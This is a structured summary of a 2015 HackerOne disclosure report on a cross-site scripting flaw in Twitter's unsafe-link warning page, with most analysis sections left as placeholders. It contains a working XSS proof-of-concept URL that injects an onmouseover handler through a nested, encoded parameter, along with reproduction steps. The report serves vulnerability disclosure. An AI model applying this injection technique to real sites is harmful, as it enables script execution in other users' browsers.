# XSS in twitter.com/safety/unsafe_link_warning

## Metadata
- **Source:** HackerOne
- **Report:** 53098 | https://hackerone.com/reports/53098
- **Submitted:** 2015-03-23
- **Reporter:** masatokinugawa
- **Program:** Unknown
- **Bounty:** $1,400
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
The following page has XSS.
https://twitter.com/safety/unsafe_link_warning?unsafe_link=[vulnerable_param]

Steps to reproduce: 
1. Go to the following URL using IE: 
https://twitter.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2Ftwitter.com%2Fsafety%2Funsafe_link_warning%3Funsafe_link%3Dhttp%3A%2F%2Fexample.com%2520onmouseover%3Dalert%281%29%2520style=font-size:100pt%2520

2. Clic

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

The following page has XSS.
https://twitter.com/safety/unsafe_link_warning?unsafe_link=[vulnerable_param]

Steps to reproduce: 
1. Go to the following URL using IE: 
https://twitter.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2Ftwitter.com%2Fsafety%2Funsafe_link_warning%3Funsafe_link%3Dhttp%3A%2F%2Fexample.com%2520onmouseover%3Dalert%281%29%2520style=font-size:100pt%2520

2. Click "continue".

3.  Do mouseover to "continue". XSS occurs.

FYI in Firefox and Chrome, it is blocked by CSP :)

I recommend fixing this.
Thanks!

</details>

---
*Analysed by Claude on 2026-05-24*
